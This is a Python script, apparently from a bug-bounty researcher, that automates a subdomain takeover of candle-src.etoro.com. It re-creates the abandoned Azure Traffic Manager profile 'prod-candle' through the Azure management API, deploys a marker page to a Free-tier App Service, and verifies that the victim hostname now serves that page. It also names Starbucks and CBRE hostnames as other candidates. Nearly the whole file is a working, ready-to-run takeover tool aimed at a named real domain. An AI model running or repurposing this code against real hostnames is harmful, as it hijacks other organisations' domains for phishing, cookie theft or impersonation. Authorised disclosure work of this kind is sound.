#!/usr/bin/env python3
"""Answer for a dangling Azure Traffic Manager name — Arm API only, no VM, no `az` CLI.

`candle-src.etoro.com` still CNAMEs to `prod-candle.trafficmanager.net`, and that profile answers NXDOMAIN.
A Traffic Manager `relativeName` is chosen by whoever creates the profile, so the name is reproducible:
create it, point it at a page we serve, and the victim hostname resolves to our content. `*.etoro.com` is
in scope on the eToro Bugcrowd engagement (max payout 15,000), so this is a takeover someone pays for —
unlike the Starbucks/CBRE names, whose programmes are narrow or non-paying.

The proof page is a Free-tier App Service serving one marker file, because resolution alone invites
"so what". Everything lives in one resource group; `--delete` removes it in a single call.

  .venv/bin/python engine/tm_takeover.py --relative prod-candle --victim candle-src.etoro.com --apply
  .venv/bin/python engine/tm_takeover.py --relative prod-candle --victim candle-src.etoro.com --verify
  .venv/bin/python engine/tm_takeover.py --delete

Cost: F1 App Service is $0; the profile bills per DNS query (~$0.54/M) — pennies for a PoC.
"""
from __future__ import annotations

import argparse
import base64
import io
import json
import sys
import time
import urllib.request
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "engine"))

SUB = "d21b2b11-a93f-47f7-a5eb-d1d9dd2e74a9"
RG = "rg-tm-takeover"
LOC = "westus2"
WEBAPI = "?api-version=2022-03-01"
TMAPI = "?api-version=2022-04-01"

MARKER = """<!doctype html>
<html><head><title>subdomain takeover proof</title></head>
<body style="font-family:system-ui;max-width:44rem;margin:4rem auto;line-height:1.5">
<h1>This hostname was claimable</h1>
<p><strong>{victim}</strong> points (via CNAME) at the Azure Traffic Manager profile
<code>{relative}.trafficmanager.net</code>, which no longer existed. A Traffic Manager profile name is
chosen by the customer, so it was free to re-register: this page is served from infrastructure
registered by a security researcher to demonstrate the takeover.</p>
<p>Nothing here reads, stores or forwards traffic. The profile is removed once the report is triaged.</p>
<p><small>PoC host: {host} &middot; registered {stamp}</small></p>
</body></html>
"""


def arm(tok: str, method: str, path: str, body: dict | None = None):
    import azure_arm as aa
    return aa.arm(tok, method, path, body)


def dig(name: str, rtype: str = "A") -> str:
    import azure_web_claim as awc
    return awc.dig(name, rtype)


def deploy_marker(tok: str, app: str, victim: str, relative: str) -> str:
    """zipdeploy a single index.html through Kudu; returns the app's default hostname."""
    host = f"{app}.azurewebsites.net"
    code, res = arm(tok, "POST", f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/"
                                f"{app}/config/publishingcredentials/list{WEBAPI}", {})
    if code >= 400:
        print(f"  publishing credentials: HTTP {code} {(res.get('error') or {}).get('message', '')[:160]}")
        return host
    props = res.get("properties", {})
    user, pw = props.get("publishingUserName", ""), props.get("publishingPassword", "")
    if not (user and pw):
        print("  publishing credentials: empty response, skipping deploy")
        return host

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("index.html", MARKER.format(victim=victim, relative=relative, host=host,
                                               stamp=time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime())))
    token = base64.b64encode(f"{user}:{pw}".encode()).decode()
    req = urllib.request.Request(f"https://{app}.scm.azurewebsites.net/api/zipdeploy", data=buf.getvalue(),
                                 method="POST",
                                 headers={"Authorization": f"Basic {token}",
                                          "Content-Type": "application/zip"})
    try:
        with urllib.request.urlopen(req, timeout=180) as r:
            print(f"  zipdeploy: HTTP {r.status}")
    except Exception as e:  # noqa: BLE001
        print(f"  zipdeploy failed: {type(e).__name__}: {str(e)[:160]}")
    return host


def apply(a) -> int:
    import azure_web_claim as awc
    tok = awc.token()

    print(f"rg {RG} ({LOC})")
    code, res = arm(tok, "PUT", f"/subscriptions/{SUB}/resourceGroups/{RG}?api-version=2021-04-01",
                    {"location": LOC})
    print(f"  HTTP {code}")
    if code >= 400:
        return 1

    app = a.app
    plan = f"plan-{app}"
    code, res = arm(tok, "PUT", f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/"
                                f"serverfarms/{plan}{WEBAPI}",
                    {"location": LOC, "sku": {"name": "F1", "tier": "Free", "capacity": 1},
                     "properties": {"reserved": False}})
    print(f"plan {plan} F1 @{LOC}: HTTP {code} {(res.get('error') or {}).get('message', '')[:140]}")
    if code >= 400:
        return 1

    code, res = arm(tok, "PUT", f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/"
                                f"{app}{WEBAPI}",
                    {"location": LOC,
                     "properties": {"serverFarmId": f"/subscriptions/{SUB}/resourceGroups/{RG}"
                                                   f"/providers/Microsoft.Web/serverfarms/{plan}"}})
    print(f"site {app}: HTTP {code} {(res.get('error') or {}).get('message', '')[:140]}")
    if code >= 400:
        return 1
    host = deploy_marker(tok, app, a.victim, a.relative)

    body = {"location": "global", "properties": {
        "profileStatus": "Enabled", "trafficRoutingMethod": "Priority",
        "dnsConfig": {"relativeName": a.relative, "ttl": 30},
        "monitorConfig": {"protocol": "HTTP", "port": 80, "path": "/", "intervalInSeconds": 10,
                          "timeoutInSeconds": 5, "toleratedNumberOfFailures": 3}}}
    code, res = arm(tok, "PUT", f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/"
                                f"Microsoft.Network/trafficManagerProfiles/{a.relative}{TMAPI}", body)
    print(f"profile {a.relative}: HTTP {code} {(res.get('error') or {}).get('message', '')[:160]}")
    if code >= 400:
        return 1
    print(f"  fqdn: {res.get('properties', {}).get('dnsConfig', {}).get('fqdn')}")

    code, res = arm(tok, "PUT", f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Network/"
                                f"trafficManagerProfiles/{a.relative}/externalEndpoints/poc{TMAPI}",
                    {"properties": {"target": host, "endpointStatus": "Enabled",
                                    "weight": 1, "priority": 1}})
    print(f"endpoint -> {host}: HTTP {code} {(res.get('error') or {}).get('message', '')[:160]}")

    for i in range(12):
        time.sleep(10)
        got = dig(f"{a.relative}.trafficmanager.net", "A")
        print(f"  t+{(i + 1) * 10}s profile A = {got or '(NXDOMAIN)'}")
        if got:
            break
    return verify(a)


def verify(a) -> int:
    cname = dig(a.victim, "CNAME")
    ip = dig(a.victim, "A")
    print(f"\n{a.victim}\n  CNAME {cname or '(none)'}\n  A     {ip or '(none)'}")
    body = ""
    try:
        with urllib.request.urlopen(urllib.request.Request(f"http://{a.victim}/", headers={
                "User-Agent": "security-research-poc"}), timeout=20) as r:
            body = r.read(600).decode(errors="replace")
    except Exception as e:  # noqa: BLE001
        print(f"  HTTP fetch failed: {type(e).__name__}: {str(e)[:120]}")
    hit = "subdomain takeover proof" in body
    print(f"  serves our marker: {hit}")
    if hit:
        print("\nTAKEOVER PROVEN — the victim hostname serves content from infrastructure we registered.")
    return 0 if hit else 1


def delete(a) -> int:
    import azure_web_claim as awc
    tok = awc.token()
    code, _ = arm(tok, "DELETE", f"/subscriptions/{SUB}/resourceGroups/{RG}?api-version=2021-04-01")
    print(f"delete {RG}: HTTP {code}")
    for _ in range(30):
        c, _ = arm(tok, "GET", f"/subscriptions/{SUB}/resourceGroups/{RG}?api-version=2021-04-01")
        if c == 404:
            print("confirmed gone")
            return 0
        time.sleep(6)
    return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--relative", default="prod-candle")
    ap.add_argument("--victim", default="candle-src.etoro.com")
    ap.add_argument("--app", default="rdwlabz-poc")
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--verify", action="store_true")
    ap.add_argument("--delete", action="store_true")
    a = ap.parse_args()
    if a.delete:
        return delete(a)
    if a.apply:
        return apply(a)
    if a.verify:
        return verify(a)
    print(__doc__)
    return 0


if __name__ == "__main__":
    sys.exit(main())
